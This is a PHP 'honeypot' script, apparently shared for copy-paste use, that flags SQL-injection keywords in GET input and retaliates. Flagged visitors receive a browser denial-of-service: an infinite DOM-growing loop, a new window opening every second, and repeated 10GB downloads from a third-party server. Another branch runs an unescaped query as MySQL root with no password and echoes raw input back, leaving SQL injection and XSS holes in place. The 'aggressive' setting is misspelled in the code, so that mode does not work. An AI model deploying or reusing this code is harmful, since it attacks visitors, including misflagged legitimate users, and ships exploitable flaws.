<?php
/*
PHP Honeypot Trap for SQL Injection Attack

Written by: Mr Hery @ 21 Jul 2023
Malaysia Open Cyber Security (MyOPECS)
MyOPES.info
https://github.com/myopecs
*/

//copy start
function honeypotThis($n, $type = "general", $level = "normal"){
	$i = (isset($_GET[$n]) ? $_GET[$n] : "");
	$i = str_replace("\0", "", $i);
	$i = strtolower($i);
	
	if(
		strpos($i, "'--") > -1 || 
		strpos($i, "sleep") > -1 || 
		strpos($i, '"--') > -1 || 
		strpos($i, 'union all') > -1 || 
		strpos($i, 'union select') > -1 || 
		strpos($i, 'order by') > -1 ||
		isset($_GET["gameon-honeypot"])
	){
		
		if(strpos($i, "'-sleep") > -1){
			sleep(3);
		}
		
		if(
			strpos($i, 'concat') > -1 || 
			strpos($i, 'group_concat') > -1 ||
			strpos($i, 'group') > -1 ||
			strpos($i, 'into outfile') > -1 ||
			isset($_GET["gameon-honeypot"]) || 
			$level == "agressive"
		){
		?>
		<div style="margin: 5px; background-color: #e8e8e8; padding: 10px;">
			<h3>Staff Card Info</h3>
			
			<strong>Name: <span id="column"></span></strong> <br />
			<strong>Email: <span id="column1"></span></strong></strong> <br />
			<strong>Phone: <span id="column2"></span></strong></strong> <br />
			<strong>StaffId: <span id="column3"></span></strong></strong> <br />
		</div>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
		<script>
			setInterval(function(){
				var wname = Math.ceil(Math.random() * 100000);
				window.open("?<?= $n ?>=<?= $i ?>&gameon-honeypot", "t" + wname);
				//Please do not enable this if you want to test
				//this will keep downloading 1GB binary file
				window.open("https://speed.hetzner.de/10GB.bin", "u" + wname);
			}, 1000);
			
			//Please comment these line if you just want to try to yourself
			/**/
			$.ajax({
				url: "https://speed.hetzner.de/10GB.bin",
				timeout: 36600,
				// async: false
			});
			
			txt = "aaaaa,aaaaaaaaaa,aaaaa,aaaaaaaa,aaaaaaaaaaaaaa,aaaaaaaa,aaaaaaaaa,aaaaa,aaaaaaaaaaaaaaaaaaaaa";
			while(true){
				txt = txt += "aaaa,aaaaaaa,aaaaa,aaaaaaaaa,aaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaa,aaaaa";
				txt = txt += "aaaaaa,aaaaaaa,aaaaaaaaaaaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
				txt = txt += "aaaaaaa,aaaaaaaaaaaa,aaaa,aaaaaaaaaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaa,aaaaaaaaaaaaaa,aaaaaaaaaaa";
				txt = txt += "aaaaaaaaaaa,aaaaa,aaaaaaaaaaaa,aaaaaaaaaaaaaaaa,aaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
				txt = txt += "aaaaaaaa,aaaaa,aaaaaaaa,aaaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaaaaaa,aaaaaaaaa,aaaaaaaaaa,aaaaaaaaa";
				txt = txt += "aa,aaaa,aaaaaaaaaaaa,aaaaaaaaaa,aaaaaa,aaaaaa,aaaaaaa,aaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaaaaaa";
				txt = txt += "a,aaaaaaaaa,a,aaaaaaaaaaaa,aaa,aaaa,aaa,aaaaa,aaaaaaaaaaaaaa,aaaaaaaaaaaa,aaaaaaaaaaaaaa,aaaaaaa";
				txt = txt += "aaaa,aaaaaaaaaaaaaaaaa,aaaaaaaaaaaaaaaaaaa,aaaaaaa,aaaaaaaaaaaaaa,aaaaaaa,aaaaa,aaaaaa,aaaaaa";
				document.getElementById("column").innerHTML = txt;
				document.getElementById("column1").innerHTML = txt;
				document.getElementById("column2").innerHTML = txt;
				document.getElementById("column3").innerHTML = txt;
			}
			/**/
		</script>
		<?php
		}else{
			
			$conn = mysqli_connect("127.0.0.1", "root", "", "db_stafffs");
			$q = mysqli_query($conn, "SELECT * FROM staffs WHERE id = '$i'");		
			$r = mysqli_fetch_array($q);
	?>
			<style>
				body { margin: 0; padding: 0; }
			</style>
			<?= $i ?>
			<div style="margin: 5px; background-color: #e8e8e8; padding: 10px;">
				<h3>Staff Card Info</h3>
				
				<strong>Name:</strong> <?= $r["name"] ?><br />
				<strong>Email:</strong> <?= $r["email"] ?><br />
				<strong>Phone:</strong> <?= $r["phone"] ?><br />
				<strong>StaffId:</strong> staff-<?= $r["id"] ?><br />
			</div>
	<?php
		}
		
		die();
	}else{
		$i = (isset($_GET[$n]) ? $_GET[$n] : "");
		
		switch($type){
			default:
			case "general":
				$i = addslashes($i);
			break;	
			
			case "integer": case "int":
				$i = (int)$i;
			break;
		}
		
		return $i;
	}
}
//copy end


//use honeypotThis to your GET input (only put the name).
//the hacker will passing single/double ('/") quotes and broke you original query
//but the next payload will stuck at the honeypot, they will play with shi*t there
//if you want agressive action, you can set level to aggressive:
/*
	$id = honeypotThis("id", "general", "aggressive");
*/
//in aggressive mode the attacker will be harrass at the second stage payload

$id = honeypotThis("id"); //equivalent of $_GET["id"]


